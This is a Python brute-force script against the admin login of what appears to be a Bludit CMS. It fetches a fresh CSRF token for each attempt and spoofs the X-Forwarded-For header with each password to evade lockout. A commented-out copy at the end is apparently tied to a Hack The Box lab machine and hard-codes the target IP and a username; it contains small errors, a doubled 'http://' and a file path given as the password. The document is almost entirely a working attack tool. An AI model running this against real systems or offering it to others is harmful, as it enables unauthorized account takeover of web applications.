#!/usr/bin/env python3
import re
import sys

import requests

try:
    host = "http://" + sys.argv[1]
    login_url = host + '/admin/login'
    username = sys.argv[2]
    fname = sys.argv[3]
    with open(fname, 'rb') as f:
        content = f.readlines()
        wordlist = [x.decode('utf-8', 'backslashreplace').strip() for x in content]
    for password in wordlist:
        session = requests.Session()
        login_page = session.get(login_url)
        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
        
        print('[*] Trying: {p}'.format(p = password))
        
        headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
        }
        
        data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
        }
        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
        if 'location' in login_result.headers:
            if '/admin/dashboard' in login_result.headers['location']:
                print()
                print('SUCCESS: Password found!')
                print('Use {u}:{p} to login.'.format(u = username, p = password))
                print()
                break
except IndexError:
    print()
    print("USAGE:\n\npython3 bruteforce.py <IP address> <username> <wordlist>")
    print()
"""
import re
import requests

host = 'http://http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

# Generate 50 incorrect passwords
for i in range(50):
    wordlist.append('Password{i}'.format(i = i))

# Add the correct password to the end of the list
wordlist.append('/home/avik/Desktop/CTFs/htb/blunder')

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
"""